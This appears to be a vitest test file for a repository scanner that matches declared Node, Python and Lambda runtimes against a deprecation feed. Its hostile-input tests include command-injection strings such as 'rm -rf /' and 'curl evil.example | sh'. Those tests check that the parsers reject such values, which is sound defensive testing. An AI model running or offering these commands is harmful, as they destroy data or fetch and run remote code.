import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { type FeedIndex, feedIndex } from "../src/schema/index.ts";
import { describe, expect, it } from "vitest";
import {
  declaredRuntimes,
  nodeFloor,
  pythonFloor,
  runtimeSymbol,
  scan,
  toText,
} from "../src/index.ts";
import { toManifest } from "../src/upload.ts";

const source = {
  url: "https://acme.example/schedule",
  kind: "deprecations",
  fetchedAt: "2026-01-01T00:00:00Z",
  sha256: "e".repeat(64),
};
const base = {
  schemaVersion: 1,
  kind: "deprecation",
  severity: "medium",
  status: "announced",
  title: "runtime ends",
  summary: "a runtime stops receiving fixes.",
  announcedAt: "2026-01-01",
  addedAt: "2026-01-01",
  effectiveAt: "2027-04-30",
  sources: [source],
  review: { state: "human-reviewed", extractedBy: "deterministic" },
};
const vendor = (id: string) => ({
  schemaVersion: 1,
  id,
  name: id,
  homepage: "https://acme.example/",
  category: "cloud",
  allowedDomains: ["acme.example"],
  sources: [{ url: "https://acme.example/schedule", format: "json", purpose: "deprecations" }],
  detection: {},
});
const symbol = (
  vendorId: string,
  id: string,
  values: string[],
  extra: Record<string, unknown> = {},
) => ({
  ...base,
  vendor: vendorId,
  id: `${vendorId}/2026-01-01-${id}`,
  affects: [{ type: "symbol", values }],
  ...extra,
});

const makeFeed = (events: unknown[]): FeedIndex =>
  feedIndex.parse({
    schemaVersion: 1,
    generatedAt: "2026-02-01T00:00:00Z",
    expiresAt: "2026-02-15T00:00:00Z",
    vendors: ["nodejs", "python", "aws-lambda", "vercel", "google-cloud", "acme"].map(vendor),
    events,
  });

const feed = makeFeed([
  symbol("nodejs", "node-22", ["node22"]),
  symbol("nodejs", "node-24", ["node24"]),
  symbol("python", "python-3-11", ["python3.11"]),
  symbol("python", "python-3-12", ["python3.12"], {
    effectiveAt: undefined,
    effectiveMonth: "2028-10",
  }),
  symbol("aws-lambda", "old-runtimes", ["provided.al2", "nodejs20.x", "python3.9", "nodejs18.x"]),
  symbol("aws-lambda", "java-8", ["java8.al2"]),
  symbol("vercel", "node-22", ["22.x"]),
  symbol("google-cloud", "nodejs22", ["nodejs22", "python311"]),
  symbol("aws-lambda", "node-26-planned", ["nodejs26.x"], { kind: "feature" }),
  symbol("nodejs", "node-26-cancelled", ["node26"], { status: "cancelled" }),
  symbol("acme", "lookalike", ["node22", "python3.11", "nodejs18.x"]),
]);

const repo = (files: Record<string, string>): string => {
  const root = mkdtempSync(join(tmpdir(), "repo-"));
  for (const [rel, body] of Object.entries(files)) {
    mkdirSync(dirname(join(root, rel)), { recursive: true });
    writeFileSync(join(root, rel), body);
  }
  return root;
};
const hits = (root: string, f: FeedIndex = feed) =>
  scan(root, f)
    .findings.filter((x) => x.via === "runtime")
    .map((x) => `${x.path}:${x.line}:${x.event.id}:${x.token}:${x.context}`)
    .sort();

const pkg = (node: unknown) =>
  JSON.stringify({ name: "app", version: "1.0.0", engines: { node } }, null, 2);

describe("declared runtimes", () => {
  it("reads the lowest Node major an engines range allows", () => {
    expect(nodeFloor(">=22")).toBe(22);
    expect(nodeFloor("^22.1.0")).toBe(22);
    expect(nodeFloor("22.x || 24.x")).toBe(22);
    expect(nodeFloor("24 || 22")).toBe(22);
    expect(nodeFloor(">= 22 < 25")).toBe(22);
    expect(nodeFloor(">21")).toBe(22);
    expect(nodeFloor(">21.5")).toBe(21);
    expect(nodeFloor("22 - 24")).toBe(22);
    expect(nodeFloor("~22.11")).toBe(22);
    expect(nodeFloor("v22.11.0")).toBe(22);
  });
  it.each([
    "*",
    "x",
    "<22",
    "<=24",
    "lts",
    "latest",
    "node",
    "",
    ">=22 || *",
    "22 || <20",
    "a".repeat(200),
  ])("finds no floor in %j", (spec) => {
    expect(nodeFloor(spec)).toBeUndefined();
  });
  it("reads the lowest Python minor a requires-python specifier allows", () => {
    expect(pythonFloor(">=3.11")).toBe("3.11");
    expect(pythonFloor(">=3.10, <4")).toBe("3.10");
    expect(pythonFloor("~=3.12.1")).toBe("3.12");
    expect(pythonFloor("==3.11.*")).toBe("3.11");
    expect(pythonFloor(">=3.9,>=3.11")).toBe("3.11");
    expect(pythonFloor("<3.13")).toBeUndefined();
    expect(pythonFloor("^3.11")).toBeUndefined();
    expect(pythonFloor(">=3x11")).toBeUndefined();
    expect(pythonFloor(">=3.11; rm -rf /")).toBeUndefined();
  });
  it("reads each supported file by its exact name only", () => {
    expect(declaredRuntimes("app/.nvmrc", "# pinned\nv22.11.0\n")).toEqual([
      { kind: "node", value: "22", line: 2 },
    ]);
    expect(declaredRuntimes(".node-version", "24\n")).toEqual([
      { kind: "node", value: "24", line: 1 },
    ]);
    expect(declaredRuntimes(".python-version", "3.11.4\n3.12\n")).toEqual([
      { kind: "python", value: "3.11", line: 1 },
      { kind: "python", value: "3.12", line: 2 },
    ]);
    expect(declaredRuntimes("runtime.txt", "python-3.12.1\n")).toEqual([
      { kind: "python", value: "3.12", line: 1 },
    ]);
    expect(declaredRuntimes("nvmrc", "22")).toEqual([]);
    expect(declaredRuntimes("notes/runtime.md", "python-3.12.1")).toEqual([]);
    expect(declaredRuntimes("serverless.yml.bak", "runtime: nodejs18.x")).toEqual([]);
  });
  it("leaves aliases unresolved", () => {
    for (const text of ["lts/*", "lts/jod", "node", "stable", "system"])
      expect(declaredRuntimes(".nvmrc", text)).toEqual([]);
    expect(declaredRuntimes(".python-version", "pypy3.10-7.3.12\nsystem\n")).toEqual([]);
  });
  it("reads requires-python only from the [project] table", () => {
    const toml = [
      "[tool.other]",
      'requires-python = ">=3.9"',
      "[project]",
      'name = "app"',
      'requires-python = ">=3.11"  # floor',
      "[[tool.x]]",
      'requires-python = ">=3.8"',
    ].join("\n");
    expect(declaredRuntimes("pyproject.toml", toml)).toEqual([
      { kind: "python", value: "3.11", line: 5 },
    ]);
  });
});

describe("feed symbols", () => {
  it("are interpreted only for allowlisted vendors and grammars", () => {
    expect(runtimeSymbol("nodejs", "node22")).toEqual({ kind: "node", value: "22" });
    expect(runtimeSymbol("python", "python3.11")).toEqual({ kind: "python", value: "3.11" });
    expect(runtimeSymbol("aws-lambda", "nodejs18.x")).toEqual({
      kind: "lambda",
      value: "nodejs18.x",
    });
    expect(runtimeSymbol("vercel", "22.x")).toEqual({ kind: "node", value: "22", vercel: true });
    for (const [v, s] of [
      ["acme", "node22"],
      ["google-cloud", "nodejs22"],
      ["__proto__", "node22"],
      ["constructor", "node22"],
      ["nodejs", "node22.x"],
      ["nodejs", "node022"],
      ["nodejs", "node22/../x"],
      ["nodejs", "node+22"],
      ["nodejs", "nodejs22"],
      ["python", "python3.011"],
      ["python", "python3.1+"],
      ["python", "python3"],
      ["aws-lambda", "nodejs18.x/.."],
      ["aws-lambda", "../nodejs18.x"],
      ["aws-lambda", "node:nodejs18.x"],
      ["aws-lambda", "nodejs"],
      ["vercel", "22"],
    ]) {
      expect(runtimeSymbol(v as string, s as string), `${v} ${s}`).toBeUndefined();
    }
  });
  it("that look like paths or patterns match nothing", () => {
    const hostile = makeFeed([
      symbol("nodejs", "paths", ["node22/..", "node2", "node", "@node22", "node22:latest"]),
      symbol("aws-lambda", "patterns", [
        "nodejs1.x",
        "python3",
        "runtime",
        "nodejs18.x+",
        "provided.al",
      ]),
    ]);
    const root = repo({
      "package.json": pkg(">=22"),
      ".nvmrc": "22",
      "serverless.yml": "provider:\n  name: aws\n  runtime: nodejs18.x\n",
    });
    expect(hits(root, hostile)).toEqual([]);
  });
});

describe("runtime findings", () => {
  it("reports Node, Python and Lambda deadlines at file:line, once per file and event", () => {
    const root = repo({
      "package.json": pkg(">=22"),
      ".nvmrc": "v24.1.0\n",
      ".python-version": "3.11.9\n",
      "api/runtime.txt": "python-3.12.4\n",
      "svc/pyproject.toml": '[project]\nname = "svc"\nrequires-python = ">=3.11,<4"\n',
      "functions/serverless.yml": [
        "service: api",
        "provider:",
        "  name: aws",
        "  runtime: nodejs18.x # default",
        "functions:",
        "  a:",
        "    runtime: 'python3.9'",
        "  b:",
        "    runtime: nodejs18.x",
      ].join("\n"),
      "sam/template.yaml":
        "Transform: AWS::Serverless-2016-10-31\nGlobals:\n  Function:\n    Runtime: java8.al2\n",
    });
    expect(hits(root)).toEqual([
      ".nvmrc:1:nodejs/2026-01-01-node-24:node24:code",
      ".python-version:1:python/2026-01-01-python-3-11:python3.11:code",
      "api/runtime.txt:1:python/2026-01-01-python-3-12:python3.12:code",
      "functions/serverless.yml:4:aws-lambda/2026-01-01-old-runtimes:nodejs18.x:code",
      "package.json:5:nodejs/2026-01-01-node-22:node22:code",
      "sam/template.yaml:4:aws-lambda/2026-01-01-java-8:java8.al2:code",
      "svc/pyproject.toml:3:python/2026-01-01-python-3-11:python3.11:code",
    ]);
  });

  it("ignores cancelled events, launches and vendors outside the allowlist", () => {
    const root = repo({
      ".nvmrc": "26",
      "serverless.yml": "provider:\n  runtime: nodejs26.x\n",
      "app.yaml": "runtime: python311\n",
    });
    expect(hits(root)).toEqual([]);
  });

  it("matches a template.yaml only when it is an AWS template, and only its Runtime key", () => {
    expect(hits(repo({ "template.yaml": "Runtime: python3.9\n" }))).toEqual([]);
    expect(
      hits(
        repo({
          "template.yaml":
            "Resources:\n  F:\n    Type: AWS::Lambda::Function\n    Properties:\n      runtime: python3.9\n",
        }),
      ),
    ).toEqual([]);
    expect(
      hits(
        repo({
          "template.yml":
            "Resources:\n  F:\n    Type: AWS::Lambda::Function\n    Properties:\n      Runtime: python3.9\n",
        }),
      ),
    ).toEqual(["template.yml:5:aws-lambda/2026-01-01-old-runtimes:python3.9:code"]);
  });

  it("applies Vercel deadlines only to engines.node in a project with vercel.json", () => {
    expect(
      hits(repo({ "web/package.json": pkg("22.x") })).filter((h) => h.includes("vercel")),
    ).toEqual([]);
    expect(
      hits(
        repo({ "web/package.json": pkg("22.x"), "web/.nvmrc": "22", "other/vercel.json": "{}" }),
      ).filter((h) => h.includes("vercel")),
    ).toEqual([]);
    expect(
      hits(repo({ "web/package.json": pkg("22.x"), "web/vercel.json": "{}" })).filter((h) =>
        h.includes("vercel"),
      ),
    ).toEqual(["web/package.json:5:vercel/2026-01-01-node-22:22.x:code"]);
    expect(
      hits(repo({ "package.json": pkg(">=22"), "vercel.json": "{}", ".nvmrc": "22" })).filter((h) =>
        h.includes("vercel"),
      ),
    ).toEqual(["package.json:5:vercel/2026-01-01-node-22:22.x:code"]);
  });

  it("marks tests and examples as low confidence, and keeps runtime.txt as code", () => {
    const root = repo({
      "test/fixtures/app/.nvmrc": "22",
      "examples/demo/package.json": pkg(">=22"),
      "runtime.txt": "python-3.11.2",
    });
    expect(hits(root)).toEqual([
      "examples/demo/package.json:5:nodejs/2026-01-01-node-22:node22:docs",
      "runtime.txt:1:python/2026-01-01-python-3-11:python3.11:code",
      "test/fixtures/app/.nvmrc:1:nodejs/2026-01-01-node-22:node22:test",
    ]);
  });

  it("honours .gitignore and .harbynignore and skips dependency folders", () => {
    const root = repo({
      ".gitignore": "legacy/\n",
      ".harbynignore": "infra/serverless.yml\n",
      "legacy/.nvmrc": "22",
      "infra/serverless.yml": "provider:\n  runtime: nodejs18.x\n",
      "node_modules/dep/package.json": pkg(">=22"),
    });
    expect(hits(root)).toEqual([]);
  });

  it("does not follow symlinked config files", () => {
    const outside = repo({ ".nvmrc": "22" });
    const root = repo({ "a.ts": "nothing" });
    try {
      symlinkSync(outside, join(root, "link"), "junction");
    } catch {
      return;
    }
    expect(hits(root)).toEqual([]);
  });

  it("prints and uploads the feed symbol, never the declared text", () => {
    const result = scan(
      repo({ "package.json": pkg(">=22.0.0 <25"), ".python-version": "3.11" }),
      feed,
    );
    expect(toText(result, "2026-02-01")).toContain("package.json:5  node22");
    const manifest = toManifest(result, "0.1.0");
    expect(manifest.findings).toContainEqual({
      eventId: "nodejs/2026-01-01-node-22",
      identifier: "node22",
      via: "runtime",
      context: "code",
      count: 1,
    });
    expect(JSON.stringify(manifest)).not.toContain(">=22");
  });
});

describe("hostile config files", () => {
  const zwsp = String.fromCodePoint(0x200b);
  const rlo = String.fromCodePoint(0x202e);
  const fullwidth22 = String.fromCodePoint(0xff12, 0xff12);
  const arabic22 = String.fromCodePoint(0x0662, 0x0662);

  it.each([
    "22; rm -rf /",
    "$(echo 22)",
    "`22`",
    `22${String.fromCodePoint(0)}`,
    `${zwsp}22`,
    `22${rlo}`,
    fullwidth22,
    arabic22,
    "v22.11.0.1",
    "22".repeat(5000),
  ])("does not read a Node version from %j", (text) => {
    expect(declaredRuntimes(".nvmrc", text)).toEqual([]);
  });

  it.each([
    { engines: { node: [">=22"] } },
    { engines: { node: { min: 22 } } },
    { engines: ">=22" },
    { engines: { node: `>=${fullwidth22}` } },
    { engines: { node: ">=22 || ".repeat(30) } },
    { engines: { node: `>=22${zwsp}` } },
  ])("does not read engines.node from %j", (json) => {
    expect(declaredRuntimes("package.json", JSON.stringify(json))).toEqual([]);
  });

  it("ignores lookalike runtimes and injection-shaped values in Lambda configs", () => {
    const yml = [
      "provider:",
      "  runtime: nodejs18.x; curl evil.example | sh",
      "  runtime: ${self:custom.runtime}",
      "  runtime: nodejs18.xx",
      "  runtime: NODEJS18.X",
      `  runtime: nodejs18.x${zwsp}`,
      `  runtime: nodejs${fullwidth22}.x`,
      "  # runtime: nodejs18.x",
      "  xruntime: nodejs18.x",
      `  runtime: ${"a".repeat(5000)}`,
    ].join("\n");
    expect(declaredRuntimes("serverless.yml", yml)).toEqual([]);
  });

  it("skips over-long lines and bounds what one file can declare", () => {
    expect(declaredRuntimes("serverless.yml", `  runtime: nodejs18.x ${" ".repeat(2000)}`)).toEqual(
      [],
    );
    expect(declaredRuntimes("serverless.yml", "  runtime: nodejs18.x\n".repeat(5000))).toHaveLength(
      100,
    );
  });

  it("stays linear on adversarial input (no catastrophic backtracking)", () => {
    const inputs: Array<[string, string]> = [
      ["serverless.yml", `runtime:${" ".repeat(990)}x`],
      ["serverless.yml", `runtime: '${"a".repeat(40)}${"#".repeat(900)}`],
      ["pyproject.toml", `[project]\nrequires-python = "${">=3.1".repeat(19)}"\n`],
      [".python-version", `${"3.".repeat(490)}x\n`.repeat(1000)],
      ["package.json", JSON.stringify({ engines: { node: `${"1.".repeat(49)}x` } })],
      ["template.yaml", `AWS::\n${`Runtime:${" ".repeat(900)}!\n`.repeat(1000)}`],
    ];
    const started = performance.now();
    for (const [name, text] of inputs) declaredRuntimes(name, text);
    for (const spec of [
      `${"1 ".repeat(49)}!`,
      `${"||".repeat(49)}`,
      `${">=".repeat(49)}1`,
      `${"1.".repeat(49)}`,
    ])
      nodeFloor(spec);
    for (const spec of [`${">=3.1,".repeat(14)}!`, `${"=".repeat(99)}`]) pythonFloor(spec);
    expect(performance.now() - started).toBeLessThan(1000);
  });

  it("never matches a runtime declared in a file it does not read", () => {
    const root = repo({
      "README.md": "runtime: nodejs18.x\nrequires node >=22\n",
      "src/deploy.ts": 'const runtime = "nodejs18.x"; // node22 python3.11',
      ".env.example": "NODE_VERSION=22\n",
      Dockerfile: "FROM node:22-alpine\n",
    });
    expect(hits(root)).toEqual([]);
  });
});
